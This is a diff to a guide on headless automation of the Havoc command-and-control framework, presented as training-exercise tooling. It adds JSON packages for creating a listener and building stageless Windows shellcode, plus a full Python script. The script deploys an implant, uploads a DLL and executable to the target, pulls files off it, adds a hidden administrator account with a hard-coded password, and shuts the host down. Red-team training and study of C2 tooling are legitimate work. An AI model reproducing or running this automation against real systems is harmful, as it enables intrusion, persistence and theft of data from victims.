@@ -101,16 +101,83 @@ These two tasks create the `Casper` account with the provided password and add i
 
 Qt modules such as `samdump` run inside the GUI process and emit whatever low-level tasks the demon needs. The headless CLI does not embed the Python runtime, so module commands are unavailable unless you port their implementation into your automation. Use the C++ helpers referenced above to see which raw tasks a given module sends before recreating it in Go, Python, or another scripting language.
 
+## Provisioning listeners and payloads
+
+### Create listeners programmatically
+
+The Qt client populates the `Listener.Add` payload with the same key/value pairs the dialog collects (name, bind address, host rotation, ports, proxy settings, and headers).【F:client/src/UserInterface/Dialogs/Listener.cc†L618-L697】 When the teamserver receives that package it persists the handler configuration and broadcasts the listener summary back to every client.【F:teamserver/cmd/server/listener.go†L220-L332】 The headless client can synthesise that exact package before it requests an agent build:
+
+```json
+{
+  "Head": {
+    "Event": 2,
+    "User": "Neo",
+    "Time": "06/10/2025 14:55:00"
+  },
+  "Body": {
+    "SubEvent": 1,
+    "Info": {
+      "Name": "training-http",
+      "Protocol": "HTTP",
+      "Status": "online",
+      "Secure": "false",
+      "Hosts": "0.0.0.0",
+      "HostBind": "0.0.0.0",
+      "HostRotation": "Round-Robin",
+      "PortBind": "8443",
+      "PortConn": "8443",
+      "Headers": "Server: training",
+      "Uris": "/,/health",
+      "UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+      "HostHeader": "training.local",
+      "Proxy Enabled": "false"
+    }
+  }
+}
+```
+
+Send the JSON over the WebSocket as soon as authentication succeeds. Monitor `packager.Type.Listener.Add` responses to confirm the handler reports `Status == "Online"` before building payloads.
+
+### Request stageless shellcode builds
+
+The payload generator dialog wraps the same `Gate.Stageless` request you need for a headless workflow: the `Head` marks the message as one-time, and the `Body.Info` collection specifies the agent type, listener, output format, and JSON-encoded demon configuration.【F:client/src/UserInterface/Dialogs/Payload.cc†L220-L247】 The dispatcher unmarshals that JSON, selects the listener, and invokes the native builder before returning a `Gate.Stageless` package that contains the compiled bytes in `PayloadArray`.【F:teamserver/cmd/server/dispatch.go†L821-L925】【F:teamserver/pkg/events/gate.go†L12-L27】
+
+A minimal shellcode request therefore looks like:
+
+```json
+{
+  "Head": {
+    "Event": 5,
+    "User": "Neo",
+    "Time": "06/10/2025 14:55:02",
+    "OneTime": "true"
+  },
+  "Body": {
+    "SubEvent": 2,
+    "Info": {
+      "AgentType": "Demon",
+      "Listener": "training-http",
+      "Arch": "x64",
+      "Format": "Windows Shellcode",
+      "Config": "{\"Sleep\":\"5\",\"Jitter\":\"15\",\"Injection\":{\"Alloc\":\"Win32\",\"Execute\":\"Win32\",\"Spawn64\":\"C:\\\\Windows\\\\System32\\\\notepad.exe\",\"Spawn32\":\"C:\\\\Windows\\\\SysWOW64\\\\notepad.exe\"}}"
+    }
+  }
+}
+```
+
+Reuse the profile document broadcast during the login handshake (`packager.Type.InitConnection.Profile`) to seed the `Config` string so the builder receives the same defaults as the Qt client.【F:teamserver/pkg/events/events.go†L120-L138】 After the response arrives, base64-decode `PayloadArray` and persist it as the shellcode blob you will execute on the target host.
+
 ## Automating sequential workflows
 
-The interactive REPL is convenient for ad-hoc operations, but incident simulations usually need a deterministic workflow. The headless protocol already exposes everything you need to orchestrate a queue of tasks, wait for their completion, and persist the output. Build an automation script around the same WebSocket feed that the CLI consumes:
+The interactive REPL is convenient for ad-hoc operations, but training exercises usually need a deterministic workflow that provisions infrastructure, delivers an implant, and then executes operator commands in order. The headless protocol exposes everything required to orchestrate that sequence:
 
-1. Connect to `wss://<host>:<port>/havoc/` and authenticate with the SHA3-256 password hash exactly as the headless client does. 【F:teamserver/cmd/headless/headless.go†L31-L115】【F:teamserver/cmd/server/teamserver.go†L560-L720】
-2. Subscribe to session events and keep an in-memory map of pending tasks. The server broadcasts every agent result through `packager.Type.Session.Output` together with the numeric `CommandID` you supplied earlier. 【F:teamserver/cmd/headless/headless.go†L360-L640】【F:teamserver/pkg/events/demons.go†L54-L103】
-3. For file downloads, watch for callback dictionaries with `MiscType == "download"`. The service layer attaches the file content to `MiscData` (base64) and the original file name/size to `MiscData2`. 【F:teamserver/pkg/service/service.go†L360-L412】
-4. When each task finishes, decode the `Output` payload, write it to disk if needed, and only then queue the next command so the agent processes them one after another.
+1. Connect to the teamserver, authenticate, and collect the cached profile document you will reuse during payload builds.【F:teamserver/cmd/headless/headless.go†L31-L115】【F:teamserver/pkg/events/events.go†L120-L138】
+2. Add or update the listener you want to use for the engagement and wait until the server reports it as `Online`.【F:teamserver/cmd/server/listener.go†L220-L332】
+3. Submit a `Gate.Stageless` build request that references that listener, save the returned shellcode, and execute it on the target host.【F:client/src/UserInterface/Dialogs/Payload.cc†L220-L247】【F:teamserver/cmd/server/dispatch.go†L821-L925】
+4. Track the set of agent IDs that existed before the payload ran so you can recognise the new session when it checks in.【F:teamserver/pkg/events/demons.go†L17-L66】
+5. Queue the desired commands one at a time, writing console output to disk and decoding download callbacks before scheduling the next task.【F:teamserver/pkg/service/service.go†L360-L418】
 
-The following Python script demonstrates a simple workflow runner. It logs in, waits for an agent, and then executes the commands from the earlier example sequentially. PowerShell output is written to disk before the next task is scheduled, downloads are persisted from the callback payload, and each step blocks until its corresponding `Session.Output` event appears.
+The Python script below implements that end-to-end workflow. It provisions an HTTP listener, requests a stageless x64 shellcode payload, saves the payload to `artifacts/demon.x64.bin`, waits for the new agent created by executing that shellcode, and then runs the command sequence discussed earlier. PowerShell output for the PATH queries is written to disk, uploads and downloads are mirrored to the `artifacts/` directory, and the local account creation commands are queued before `Stop-Computer` is issued as the final step. Module shortcuts such as `samdump` still require porting the Qt module logic into your automation before you can add them to the queue.
 
 ```python
 #!/usr/bin/env python3
@@ -119,180 +186,398 @@ import base64
 import hashlib
 import json
 import os
+import pathlib
+import ssl
+from datetime import datetime
+
 import websockets
 
 TEAMSERVER = "wss://127.0.0.1:40056/havoc/"
 USERNAME = "operator"
 PASSWORD = "super-secret"
-AGENT_ID = "AGT0001"
 
-# Helper to mirror the GUI's task structure
-def make_task(command_id, **fields):
-    payload = {
-        "Head": {
-            "Event": 5,               # packager.Type.Session.Type
-            "User": USERNAME,
-        },
-        "Body": {
-            "SubEvent": 2,           # packager.Type.Session.Input
-            "Info": {
-                "DemonID": AGENT_ID,
-                "CommandID": str(command_id),
-            } | fields,
-        },
+LISTENER_NAME = "training-http"
+LISTENER_BIND = "0.0.0.0"
+LISTENER_PORT = 8443
+LISTENER_HOSTS = ["0.0.0.0"]
+
+ARTIFACT_DIR = pathlib.Path("artifacts")
+SHELLCODE_PATH = ARTIFACT_DIR / "demon.x64.bin"
+
+LOCAL_DLL = pathlib.Path("/home/kali/WptsExtensions.dll")
+LOCAL_EXE = pathlib.Path("/home/kali/summon.exe")
+REMOTE_DLL = r"C:\\Users\\Alice Malice\\AppData\\Local\\Temp\\WptsExtensions.dll"
+REMOTE_EXE = r"C:\\Users\\Alice Malice\\AppData\\Local\\Temp\\summon.exe"
+
+INIT_TYPE = 0x1
+INIT_SUCCESS = 0x1
+INIT_ERROR = 0x2
+INIT_OAUTH = 0x3
+INIT_PROFILE = 0x5
+LISTENER_TYPE = 0x2
+LISTENER_ADD = 0x1
+LISTENER_ERROR = 0x5
+SESSION_TYPE = 0x7
+SESSION_NEW = 0x1
+SESSION_INPUT = 0x3
+SESSION_OUTPUT = 0x4
+GATE_TYPE = 0x5
+GATE_STAGELESS = 0x2
+
+
+def timestamp():
+    return datetime.utcnow().strftime("%m/%d/%Y %H:%M:%S")
+
+
+def sha3(password):
+    return hashlib.sha3_256(password.encode()).hexdigest()
+
+
+def b64(data):
+    return base64.b64encode(data).decode()
+
+
+def read_file_b64(path):
+    data = path.expanduser().read_bytes()
+    return b64(data)
+
+
+def make_package(event, subevent, info, *, user=USERNAME, one_time=False):
+    head = {"Event": event, "User": user, "Time": timestamp()}
+    if one_time:
+        head["OneTime"] = "true"
+    return {"Head": head, "Body": {"SubEvent": subevent, "Info": info}}
+
+
+def make_task(agent_id, command_id, command_line, **fields):
+    task_id = os.urandom(4).hex()
+    info = {
+        "TaskID": task_id,
+        "DemonID": agent_id,
+        "CommandID": str(command_id),
+        "CommandLine": command_line,
     }
-    if "TaskID" not in payload["Body"]["Info"]:
-        payload["Body"]["Info"]["TaskID"] = os.urandom(4).hex()
-    return payload
+    info.update(fields)
+    return task_id, make_package(SESSION_TYPE, SESSION_INPUT, info)
 
 
-WORKFLOW = [
-    {
-        "name": "machine_path",
-        "task": make_task(
-            0x1010,
-            CommandLine="powershell",
-            ProcCommand="4",
-            Args="0;FALSE;TRUE;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe;"
-            + base64.b64encode(b"[System.Environment]::GetEnvironmentVariable('Path','Machine')").decode(),
-        ),
-        "outfile": "machine-path.txt",
-    },
-    {
-        "name": "user_path",
-        "task": make_task(
-            0x1010,
-            CommandLine="powershell",
-            ProcCommand="4",
-            Args="0;FALSE;TRUE;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe;"
-            + base64.b64encode(b"[System.Environment]::GetEnvironmentVariable('Path','User')").decode(),
-        ),
-        "outfile": "user-path.txt",
-    },
-    {
-        "name": "upload_wpts",
-        "task": make_task(
-            15,
-            SubCommand="upload",
-            Arguments=base64.b64encode(b"C:\\Users\\Alice Malice\\AppData\\Local\\Temp\\WptsExtensions.dll").decode(),
-            File=base64.b64encode(open("/home/kali/WptsExtensions.dll", "rb").read()).decode(),
-        ),
-    },
-    {
-        "name": "upload_summon",
-        "task": make_task(
-            15,
-            SubCommand="upload",
-            Arguments=base64.b64encode(b"C:\\Users\\Alice Malice\\AppData\\Local\\Temp\\summon.exe").decode(),
-            File=base64.b64encode(open("/home/kali/summon.exe", "rb").read()).decode(),
-        ),
-    },
-    {
-        "name": "stop_computer",
-        "task": make_task(
-            0x1010,
-            CommandLine="powershell",
-            ProcCommand="4",
-            Args="0;FALSE;TRUE;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe;"
-            + base64.b64encode(b"Stop-Computer").decode(),
-        ),
-    },
-    {
-        "name": "download_samantha",
-        "task": make_task(15, SubCommand="download", Arguments=base64.b64encode(b"C:\\samantha.txt").decode()),
-        "download": "C:/samantha.txt",
-    },
-    {
-        "name": "download_systemic",
-        "task": make_task(15, SubCommand="download", Arguments=base64.b64encode(b"C:\\systemic.txt").decode()),
-        "download": "C:/systemic.txt",
-    },
-    {
-        "name": "download_security",
-        "task": make_task(15, SubCommand="download", Arguments=base64.b64encode(b"C:\\security.txt").decode()),
-        "download": "C:/security.txt",
-    },
-    {
-        "name": "add_user",
-        "task": make_task(
-            0x1010,
-            CommandLine="powershell",
-            ProcCommand="4",
-            Args="0;FALSE;TRUE;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe;"
-            + base64.b64encode(b"net user Casper IamAGhost12345!!! /add").decode(),
-        ),
-    },
-    {
-        "name": "add_to_admins",
-        "task": make_task(
-            0x1010,
-            CommandLine="powershell",
-            ProcCommand="4",
-            Args="0;FALSE;TRUE;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe;"
-            + base64.b64encode(b"net localgroup Administrators Casper /add").decode(),
-        ),
-    },
-]
+def encode_ps(command):
+    return (
+        "0;FALSE;TRUE;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe;"
+        + b64(command.encode())
+    )
+
+
+def encode_path(path):
+    return b64(path.encode("utf-8"))
 
 
 async def authenticate(ws):
-    pwd_hash = hashlib.sha3_256(PASSWORD.encode()).hexdigest()
-    request = {
-        "Head": {
-            "Event": 1,  # packager.Type.InitConnection.Type
-            "User": USERNAME,
-        },
-        "Body": {
-            "SubEvent": 1,  # OAuthRequest
-            "Info": {"User": USERNAME, "Password": pwd_hash},
-        },
-    }
+    request = make_package(
+        INIT_TYPE,
+        INIT_OAUTH,
+        {"User": USERNAME, "Password": sha3(PASSWORD)},
+    )
     await ws.send(json.dumps(request))
 
 
+def listener_payload():
+    hosts = ", ".join(LISTENER_HOSTS)
+    info = {
+        "Name": LISTENER_NAME,
+        "Protocol": "HTTP",
+        "Status": "online",
+        "Secure": "false",
+        "Hosts": hosts,
+        "HostBind": LISTENER_BIND,
+        "HostRotation": "Round-Robin",
+        "PortBind": str(LISTENER_PORT),
+        "PortConn": str(LISTENER_PORT),
+        "Headers": "Server: training",
+        "Uris": "/,/health",
+        "UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+        "HostHeader": "training.local",
+        "Proxy Enabled": "false",
+    }
+    return make_package(LISTENER_TYPE, LISTENER_ADD, info)
+
+
+def gate_payload(config_json):
+    info = {
+        "AgentType": "Demon",
+        "Listener": LISTENER_NAME,
+        "Arch": "x64",
+        "Format": "Windows Shellcode",
+        "Config": config_json,
+    }
+    return make_package(GATE_TYPE, GATE_STAGELESS, info, one_time=True)
+
+
+def build_workflow(agent_id):
+    steps = []
+
+    def append_step(name, payload, **extras):
+        step = {
+            "name": name,
+            "payload": payload,
+            "command_id": payload["Body"]["Info"]["CommandID"],
+            "task_id": payload["Body"]["Info"]["TaskID"],
+        }
+        step.update(extras)
+        steps.append(step)
+
+    _, payload = make_task(
+        agent_id,
+        0x1010,
+        "powershell [System.Environment]::GetEnvironmentVariable('Path','Machine')",
+        ProcCommand="4",
+        Args=encode_ps("[System.Environment]::GetEnvironmentVariable('Path','Machine')"),
+    )
+    append_step("machine_path", payload, outfile=ARTIFACT_DIR / "machine-path.txt")
+
+    _, payload = make_task(
+        agent_id,
+        0x1010,
+        "powershell [System.Environment]::GetEnvironmentVariable('Path','User')",
+        ProcCommand="4",
+        Args=encode_ps("[System.Environment]::GetEnvironmentVariable('Path','User')"),
+    )
+    append_step("user_path", payload, outfile=ARTIFACT_DIR / "user-path.txt")
+
+    _, payload = make_task(
+        agent_id,
+        15,
+        f"upload {LOCAL_DLL} {REMOTE_DLL}",
+        SubCommand="upload",
+        Arguments=encode_path(REMOTE_DLL),
+        File=read_file_b64(LOCAL_DLL),
+    )
+    append_step("upload_wpts", payload)
+
+    _, payload = make_task(
+        agent_id,
+        15,
+        f"upload {LOCAL_EXE} {REMOTE_EXE}",
+        SubCommand="upload",
+        Arguments=encode_path(REMOTE_EXE),
+        File=read_file_b64(LOCAL_EXE),
+    )
+    append_step("upload_summon", payload)
+
+    for name, remote in [
+        ("download_samantha", r"C:\\samantha.txt"),
+        ("download_systemic", r"C:\\systemic.txt"),
+        ("download_security", r"C:\\security.txt"),
+    ]:
+        _, payload = make_task(
+            agent_id,
+            15,
+            f"download {remote}",
+            SubCommand="download",
+            Arguments=encode_path(remote),
+        )
+        append_step(name, payload, download=remote)
+
+    _, payload = make_task(
+        agent_id,
+        0x1010,
+        "powershell net user Casper IamAGhost12345!!! /add",
+        ProcCommand="4",
+        Args=encode_ps("net user Casper IamAGhost12345!!! /add"),
+    )
+    append_step("add_user", payload)
+
+    _, payload = make_task(
+        agent_id,
+        0x1010,
+        "powershell net localgroup Administrators Casper /add",
+        ProcCommand="4",
+        Args=encode_ps("net localgroup Administrators Casper /add"),
+    )
+    append_step("add_to_admins", payload)
+
+    _, payload = make_task(
+        agent_id,
+        0x1010,
+        "powershell Stop-Computer",
+        ProcCommand="4",
+        Args=encode_ps("Stop-Computer"),
+    )
+    append_step("stop_computer", payload, expect_output=False)
+
+    return steps
+
+
 async def workflow_runner():
-    async with websockets.connect(TEAMSERVER, ssl=not TEAMSERVER.startswith("ws://")) as ws:
+    ARTIFACT_DIR.mkdir(parents=True, exist_ok=True)
+
+    ssl_context = None
+    if TEAMSERVER.startswith("wss://"):
+        ssl_context = ssl.create_default_context()
+        ssl_context.check_hostname = False
+        ssl_context.verify_mode = ssl.CERT_NONE
+
+    async with websockets.connect(TEAMSERVER, ssl=ssl_context) as ws:
         await authenticate(ws)
-        pending = list(WORKFLOW)
-        downloads = {}
 
-        while pending:
-            current = pending[0]
-            await ws.send(json.dumps(current["task"]))
+        listener_sent = False
+        listener_ready = False
+        payload_requested = False
+        payload_saved = False
+        profile_json = ""
+        seen_agents = set()
+        baseline_agents = set()
+        agent_id = None
+        workflow = []
+        current_step = None
+        workflow_done = False
 
-            while True:
-                message = json.loads(await ws.recv())
-                head, body = message.get("Head", {}), message.get("Body", {})
-
-                if head.get("Event") != 5 or body.get("SubEvent") != 3:
-                    continue  # ignore non Session.Output traffic
-
-                info = body.get("Info", {})
-                if info.get("DemonID") != AGENT_ID:
+        async def maybe_queue_next():
+            nonlocal current_step, workflow_done
+            while agent_id and not current_step and workflow:
+                current_step = workflow.pop(0)
+                package = current_step["payload"]
+                package["Head"]["Time"] = timestamp()
+                command_line = package["Body"]["Info"].get("CommandLine", "")
+                print(f"[>] queued {current_step['name']}: {command_line}")
+                await ws.send(json.dumps(package))
+                if not current_step.get("expect_output", True):
+                    print(f"[!] {current_step['name']} does not return output; continuing")
+                    current_step = None
                     continue
+            if agent_id and not workflow and current_step is None and not workflow_done:
+                workflow_done = True
+                print("[*] command workflow finished")
 
-                output = base64.b64decode(info.get("Output", "")).decode(errors="ignore")
-                if current.get("outfile"):
-                    with open(current["outfile"], "w", encoding="utf-8") as f:
-                        f.write(output)
+        while True:
+            message = json.loads(await ws.recv())
+            head = message.get("Head", {})
+            body = message.get("Body", {})
+            event = head.get("Event")
+            subevent = body.get("SubEvent")
+            info = body.get("Info", {})
 
-                if current.get("download"):
-                    callback = json.loads(output)
-                    if callback.get("MiscType") == "download":
-                        content = base64.b64decode(callback["MiscData"])
-                        name = base64.b64decode(callback["MiscData2"].split(";")[0]).decode()
-                        with open(os.path.basename(name), "wb") as f:
-                            f.write(content)
+            if event == INIT_TYPE:
+                if subevent == INIT_SUCCESS:
+                    print(f"[+] authenticated as {USERNAME}")
+                    if not listener_sent:
+                        pkg = listener_payload()
+                        pkg["Head"]["Time"] = timestamp()
+                        await ws.send(json.dumps(pkg))
+                        listener_sent = True
+                        print(f"[>] requested listener {LISTENER_NAME}")
+                elif subevent == INIT_ERROR:
+                    print(f"[-] authentication failed: {info.get('Message', 'unknown error')}")
+                    return
+                elif subevent == INIT_PROFILE:
+                    profile_json = info.get("Demon", "")
+                    print(f"[+] received profile template ({len(profile_json)} bytes)")
+                    if listener_ready and not payload_requested:
+                        pkg = gate_payload(profile_json)
+                        pkg["Head"]["Time"] = timestamp()
+                        await ws.send(json.dumps(pkg))
+                        payload_requested = True
+                        print("[>] requested shellcode build")
+            elif event == LISTENER_TYPE:
+                name = info.get("Name") or info.get("ListenerName")
+                status = info.get("Status", "")
+                if subevent == LISTENER_ADD and name == LISTENER_NAME:
+                    print(f"[+] listener {name} -> {status}")
+                    if status.lower() == "online":
+                        listener_ready = True
+                        if profile_json and not payload_requested:
+                            pkg = gate_payload(profile_json)
+                            pkg["Head"]["Time"] = timestamp()
+                            await ws.send(json.dumps(pkg))
+                            payload_requested = True
+                            print("[>] requested shellcode build")
+                elif subevent == LISTENER_ERROR and name == LISTENER_NAME:
+                    print(f"[-] listener error: {info.get('Error', 'unknown error')}")
+            elif event == GATE_TYPE and subevent == GATE_STAGELESS:
+                if "PayloadArray" in info:
+                    data = base64.b64decode(info["PayloadArray"])
+                    SHELLCODE_PATH.parent.mkdir(parents=True, exist_ok=True)
+                    SHELLCODE_PATH.write_bytes(data)
+                    payload_saved = True
+                    baseline_agents = set(seen_agents)
+                    print(f"[+] saved shellcode to {SHELLCODE_PATH} ({len(data)} bytes)")
+                    print("[*] execute the payload on the target to register a new agent")
+                elif "Message" in info:
+                    print(f"[builder] {info.get('MessageType', 'Info')}: {info['Message']}")
+            elif event == SESSION_TYPE:
+                if subevent == SESSION_NEW:
+                    name = info.get("NameID")
+                    if name:
+                        seen_agents.add(name)
+                        if payload_saved and agent_id is None and name not in baseline_agents:
+                            agent_id = name
+                            print(f"[+] new agent registered: {agent_id}")
+                            workflow = build_workflow(agent_id)
+                            await maybe_queue_next()
+                elif subevent == SESSION_OUTPUT and agent_id and info.get("DemonID") == agent_id:
+                    if not current_step or info.get("CommandID") != current_step["command_id"]:
+                        continue
+
+                    output_data = base64.b64decode(info.get("Output", ""))
+                    text = output_data.decode("utf-8", errors="ignore")
+
+                    if current_step.get("download"):
+                        try:
+                            callback = json.loads(text)
+                        except json.JSONDecodeError:
+                            if text.strip():
+                                print(f"[{current_step['name']}] {text.strip()}")
+                            continue
+
+                        if callback.get("MiscType") == "download" and "MiscData" in callback:
+                            content = base64.b64decode(callback["MiscData"])
+                            remote_name_b64 = callback.get("MiscData2", "").split(";", 1)[0]
+                            if remote_name_b64:
+                                remote_name = base64.b64decode(remote_name_b64).decode("utf-8", errors="ignore")
+                            else:
+                                remote_name = current_step["download"]
+                            out_path = ARTIFACT_DIR / pathlib.Path(remote_name).name
+                            out_path.write_bytes(content)
+                            print(f"[+] downloaded {remote_name} -> {out_path}")
+                            current_step = None
+                            await maybe_queue_next()
+                        else:
+                            if "Message" in callback:
+                                print(f"[{current_step['name']}] {callback['Message']}")
+                    else:
+                        if current_step.get("outfile"):
+                            current_step["outfile"].parent.mkdir(parents=True, exist_ok=True)
+                            current_step["outfile"].write_text(text, encoding="utf-8")
+                            print(f"[+] wrote output to {current_step['outfile']}")
+                        elif text.strip():
+                            try:
+                                structured = json.loads(text)
+                            except json.JSONDecodeError:
+                                print(f"[{current_step['name']}] {text.strip()}")
+                            else:
+                                if "Message" in structured:
+                                    print(f"[{current_step['name']}] {structured['Message']}")
+                                else:
+                                    print(f"[{current_step['name']}] {text.strip()}")
+                        current_step = None
+                        await maybe_queue_next()
+
+            if workflow_done:
                 break
 
-            pending.pop(0)
+
+async def main():
+    try:
+        await workflow_runner()
+    except FileNotFoundError as exc:
+        print(f"[-] required file not found: {exc.filename}")
 
 
 if __name__ == "__main__":
-    asyncio.run(workflow_runner())
+    asyncio.run(main())
 ```
 
-Adapt the `WORKFLOW` list to add delays, conditional logic, or additional modules. Because the loop waits for each `Session.Output` package before moving forward, the agent never has multiple long-running tasks queued at the same time. The pattern also keeps console transcripts and downloaded artefacts in local files so they can be handed to trainees alongside the Havoc logs.
+Update the constants at the top of the script for your environment (teamserver URI, credentials, listener settings, and local file paths). The download handler writes the retrieved files alongside the other artefacts so you can distribute them with the training materials. Because the loop waits for each `Session.Output` package before moving forward, the agent never has more than one outstanding command and you get deterministic logs of every action.【F:teamserver/pkg/events/demons.go†L17-L66】【F:teamserver/pkg/service/service.go†L360-L418】
 
 ## 1. Understand the Transport
 
